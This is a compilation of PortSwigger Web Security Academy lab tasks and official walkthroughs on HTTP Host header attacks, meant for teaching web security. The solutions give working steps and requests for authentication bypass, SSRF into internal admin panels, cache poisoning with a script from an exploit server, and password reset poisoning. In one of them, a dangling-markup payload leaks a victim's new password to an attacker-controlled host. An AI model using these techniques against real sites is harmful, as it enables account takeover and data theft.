# PortSwigger labs: host header

> Copied from <https://portswigger.net/web-security/host-header>. Questions and answers are the source's own; nothing was answered or rewritten here.


## 1. Host header authentication bypass

[Open the lab](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass)

This lab makes an assumption about the privilege level of the user based on the HTTP Host header.

To solve the lab, access the admin panel and delete the user `carlos`.

<details><summary>Official solution</summary>

1. Send the `GET /` request that received a 200 response to Burp Repeater. Notice that you can change the Host header to an arbitrary value and still successfully access the home page.
2. Browse to `/robots.txt` and observe that there is an admin panel at `/admin`.
3. Try and browse to `/admin`. You do not have access, but notice the error message, which reveals that the panel can be accessed by local users.
4. Send the `GET /admin` request to Burp Repeater.
5. In Burp Repeater, change the Host header to `localhost` and send the request. Observe that you have now successfully accessed the admin panel, which provides the option to delete different users.
6. Change the request line to `GET /admin/delete?username=carlos` and send the request to delete `carlos` to solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=LWJzVIKlFpQ

</details>


## 2. Host validation bypass via connection state attack

[Open the lab](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)

This lab is vulnerable to routing-based SSRF via the Host header. Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives.

To solve the lab, exploit this behavior to access an internal admin panel located at `192.168.0.1/admin`, then delete the user `carlos`.

<details><summary>Hint</summary>

Solving this lab requires features first released in [Burp Suite 2022.8.1](https://portswigger.net/burp/releases/professional-community-2022-8-1?requestededition=professional).

</details>

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#state).

<details><summary>Official solution</summary>

1. Send the `GET /` request to Burp Repeater.
2. Make the following adjustments:

   - Change the path to `/admin`.
   - Change `Host` header to `192.168.0.1`.
3. Send the request. Observe that you are simply redirected to the homepage.
4. Duplicate the tab, then add both tabs to a new group.
5. Select the first tab and make the following adjustments:

   - Change the path back to `/`.
   - Change the `Host` header back to `YOUR-LAB-ID.h1-web-security-academy.net`.
6. Using the drop-down menu next to the **Send** button, change the send mode to **Send group in sequence (single connection)**.
7. Change the `Connection` header to `keep-alive`.
8. Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel.
9. Study the response and observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details:

   - The action attribute (`/admin/delete`)
   - The name of the input (`username`)
   - The `csrf` token.
10. On the second tab in your group, use these details to replicate the request that would be issued when submitting the form. The result should look something like this:

    `POST /admin/delete HTTP/1.1
    Host: 192.168.0.1
    Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
    Content-Type: x-www-form-urlencoded
    Content-Length: CORRECT
    csrf=YOUR-CSRF-TOKEN&username=carlos`
11. Send the requests in sequence down a single connection to solve the lab.

</details>


## 3. Routing-based SSRF

[Open the lab](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)

This lab is vulnerable to routing-based SSRF via the Host header. You can exploit this to access an insecure intranet admin panel located on an internal IP address.

To solve the lab, access the internal admin panel located in the `192.168.0.0/24` range, then delete the user `carlos`.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

<details><summary>Official solution</summary>

1. Send the `GET /` request that received a `200` response to Burp Repeater.
2. In Burp Repeater, select the Host header value, right-click and select **Insert Collaborator payload** to replace it with a Collaborator domain name. Send the request.
3. Go to the Collaborator tab and click **Poll now**. You should see a couple of network interactions in the table, including an HTTP request. This confirms that you are able to make the website's middleware issue requests to an arbitrary server.
4. Send the `GET /` request to Burp Intruder.
5. Go to **Intruder**.
6. Deselect **Update Host header to match target**.
7. Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet:

   `Host: 192.168.0.§0§`
8. In the **Payloads** side panel, select the payload type **Numbers**. Under **Payload configuration**, enter the following values:

   `From: 0
   To: 255
   Step: 1`
9. Click  **Start attack**. A warning will inform you that the Host header does not match the specified target host. As we've done this deliberately, you can ignore this message.
10. When the attack finishes, click the **Status** column to sort the results. Notice that a single request received a `302` response redirecting you to `/admin`. Send this request to Burp Repeater.
11. In Burp Repeater, change the request line to `GET /admin` and send the request. In the response, observe that you have successfully accessed the admin panel.
12. Study the form for deleting users. Notice that it will generate a `POST` request to `/admin/delete` with both a CSRF token and `username` parameter. You need to manually craft an equivalent request to delete `carlos`.
13. Change the path in your request to `/admin/delete`. Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a `username` parameter containing `carlos`. The request line should now look like this but with a different CSRF token:

    `GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos`
14. Copy the session cookie from the `Set-Cookie` header in the displayed response and add it to your request.
15. Right-click on your request and select **Change request method**. Burp will convert it to a `POST` request.
16. Send the request to delete `carlos` and solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=P__vqYzyF3w

</details>


## 4. SSRF via flawed request parsing

[Open the lab](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)

This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.

To solve the lab, access the internal admin panel located in the `192.168.0.0/24` range, then delete the user `carlos`.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

<details><summary>Official solution</summary>

1. Send the `GET /` request that received a `200` response to Burp Repeater and study the lab's behavior. Observe that the website validates the Host header and blocks any requests in which it has been modified.
2. Observe that you can also access the home page by supplying an absolute URL in the request line as follows:

   `GET https://YOUR-LAB-ID.web-security-academy.net/`
3. Notice that when you do this, modifying the Host header no longer causes your request to be blocked. Instead, you receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header.
4. Use Burp Collaborator to confirm that you can make the website's middleware issue requests to an arbitrary server in this way. For example, the following request will trigger an HTTP request to your Collaborator server:

   `GET https://YOUR-LAB-ID.web-security-academy.net/
   Host: BURP-COLLABORATOR-SUBDOMAIN`
5. Right-click and select **Insert Collaborator payload** to insert a Burp Collaborator subdomain where indicated in the request.
6. Send the request containing the absolute URL to Burp Intruder.
7. Go to **Intruder** and deselect **Update Host header to match target**.
8. Use the Host header to scan the IP range `192.168.0.0/24` to identify the IP address of the admin interface. Send this request to Burp Repeater.
9. In Burp Repeater, append `/admin` to the absolute URL in the request line and send the request. Observe that you now have access to the admin panel, including a form for deleting users.
10. Change the absolute URL in your request to point to `/admin/delete`. Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a `username` parameter containing `carlos`. The request line should now look like this but with a different CSRF token:

    `GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos`
11. Copy the session cookie from the `Set-Cookie` header in the displayed response and add it to your request.
12. Right-click on your request and select "Change request method". Burp will convert it to a `POST` request.
13. Send the request to delete `carlos` and solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=au0h7ruxCwM

</details>


## 5. Web cache poisoning via ambiguous requests

[Open the lab](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)

This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page.

To solve the lab, poison the cache so the home page executes `alert(document.cookie)` in the victim's browser.

<details><summary>Official solution</summary>

1. In Burp's browser, open the lab and click **Home** to refresh the home page.
2. In **Proxy > HTTP history**, right-click the `GET /` request and select **Send to Repeater**.
3. In Repeater, study the lab's behavior. Notice that the website validates the Host header. If you modify the Host header, you can no longer access the home page.
4. In the original response, notice the verbose caching headers, which tell you when you get a cache hit and how old the cached response is. Add an arbitrary query parameter to your requests to serve as a cache buster, for example, `GET /?cb=123`. You can change this parameter each time you want a fresh response from the back-end server.
5. Notice that if you add a second Host header with an arbitrary value, this appears to be ignored when validating and routing your request. Crucially, notice that the arbitrary value of your second Host header is reflected in an absolute URL used to import a script from `/resources/js/tracking.js`.
6. Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value.
7. Go to the exploit server and create a file at `/resources/js/tracking.js` containing the payload `alert(document.cookie)`. Store the exploit and copy the domain name for your exploit server.
8. Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this:

   `GET /?cb=123 HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
9. Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in the browser using the same cache buster in the URL. Make sure that the `alert()` fires.
10. In Burp Repeater, remove any cache busters and keep replaying the request until you have re-poisoned the cache. The lab is solved when the victim visits the home page.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=2r00mmL1UYg

</details>


## 6. Basic password reset poisoning

[Open the lab](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)

This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

<details><summary>Official solution</summary>

1. Go to the login page and notice the "Forgot your password?" functionality. Request a password reset for your own account.
2. Go to the exploit server and open the email client. Observe that you have received an email containing a link to reset your password. Notice that the URL contains the query parameter `temp-forgot-password-token`.
3. Click the link and observe that you are prompted to enter a new password. Reset your password to whatever you want.
4. In Burp, study the HTTP history. Notice that the `POST /forgot-password` request is used to trigger the password reset email. This contains the username whose password is being reset as a body parameter. Send this request to Burp Repeater.
5. In Burp Repeater, observe that you can change the Host header to an arbitrary value and still successfully trigger a password reset. Go back to the email server and look at the new email that you've received. Notice that the URL in the email contains your arbitrary Host header instead of the usual domain name.
6. Back in Burp Repeater, change the Host header to your exploit server's domain name (`YOUR-EXPLOIT-SERVER-ID.exploit-server.net`) and change the `username` parameter to `carlos`. Send the request.
7. Go to your exploit server and open the access log. You will see a request for `GET /forgot-password` with the `temp-forgot-password-token` parameter containing Carlos's password reset token. Make a note of this token.
8. Go to your email client and copy the genuine password reset URL from your first email. Visit this URL in the browser, but replace your reset token with the one you obtained from the access log.
9. Change Carlos's password to whatever you want, then log in as `carlos` to solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=24IsNsLWtco

</details>


## 7. Password reset poisoning via dangling markup

[Open the lab](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)

This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

<details><summary>Hint</summary>

Some antivirus software scans links in emails to identify whether they are malicious.

</details>

<details><summary>Official solution</summary>

1. Go to the login page and request a password reset for your own account.
2. Go to the exploit server and open the email client to find the password reset email. Observe that the link in the email simply points to the generic login page and the URL does not contain a password reset token. Instead, a new password is sent directly in the email body text.
3. In the proxy history, study the response to the `GET /email` request. Observe that the HTML content for your email is written to a string, but this is being sanitized using the `DOMPurify` library before it is rendered by the browser.
4. In the email client, notice that you have the option to view each email as raw HTML instead. Unlike the rendered version of the email, this does not appear to be sanitized in any way.
5. Send the `POST /forgot-password` request to Burp Repeater. Observe that tampering with the domain name in the Host header results in a server error. However, you are able to add an arbitrary, non-numeric port to the Host header and still reach the site as normal. Sending this request will still trigger a password reset email:

   `Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport`
6. In the email client, check the raw version of your emails. Notice that your injected port is reflected inside a link as an unescaped, single-quoted string. This is later followed by the new password.
7. Send the `POST /forgot-password` request again, but this time use the port to break out of the string and inject a dangling-markup payload pointing to your exploit server:

   `Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?`
8. Check the email client. You should have received a new email in which most of the content is missing. Go to the exploit server and check the access log. Notice that there is an entry for a request that begins `GET /?/login'>[…]`, which contains the rest of the email body, including the new password.
9. In Burp Repeater, send the request one last time, but change the `username` parameter to `carlos`. Refresh the access log and obtain Carlos's new password from the corresponding log entry.
10. Log in as `carlos` using this new password to solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=_cTrwP4DasI

</details>

